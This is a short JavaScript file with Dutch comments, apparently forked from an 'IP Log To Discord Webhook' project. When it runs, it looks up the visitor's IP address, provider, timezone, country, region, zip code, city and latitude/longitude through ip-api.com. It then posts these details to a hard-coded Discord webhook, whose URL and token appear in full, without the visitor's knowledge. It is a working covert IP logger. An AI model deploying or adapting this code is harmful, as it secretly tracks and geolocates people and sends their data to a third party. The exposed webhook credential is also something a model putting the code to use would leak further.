// Vervang WEBHOOKURL door je eigen Discord Webhook URL
const webHookUrl = "https://discord.com/api/webhooks/1310562977971175425/DILmHb8nxmmVV0f1vfR4D2yoOcMZL-D1RevuOOSaJVndxL2InKUcQpZSFUCwGRjuwEEY";

/*
    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
    License: MIT
    ** Let op: Deel je Webhook URL nooit in publieke code! **
*/

const sendToWebhook = async () => {
    try {
        // Haal gegevens op van de IP API
        const response = await fetch('https://ip-api.com/json/');
        if (!response.ok) throw new Error("IP-API request failed");
        
        const data = await response.json();

        // Variabelen instellen
        const ip = data.query;
        const provider = `${data.org} (${data.as})`;
        const timezone = data.timezone;
        const country = data.country;
        const countryCode = data.countryCode.toLowerCase();
        const region = `${data.region} (${data.regionName})`;
        const city = data.city;
        const zip = data.zip;
        const lat = data.lat;
        const lon = data.lon;

        // Payload voor de webhook
        const params = {
            username: "IP Log",
            avatar_url: "",
            content: `
__**🌐 IP-Address:**__ 
\`${ip}\`

__**📞 Provider:**__ 
${provider}

__**🗺️ Timezone:**__ 
${timezone}

__**:flag_${countryCode}: Country and Region:**__ 
${country} - ${region}

__**🏙️ Zip Code & City:**__ 
${zip} ${city}

__**📍 Location:**__ 
**Longitude:** ${lon}
**Latitude:** ${lat}
            `
        };

        // Verstuur gegevens naar de Discord webhook
        const webhookResponse = await fetch(webHookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        });

        if (!webhookResponse.ok) throw new Error("Webhook request failed");
        console.log("Gegevens succesvol verzonden naar Discord Webhook.");
    } catch (error) {
        console.error("Fout opgetreden:", error.message);
    }
};

// Voer de functie uit
sendToWebhook();
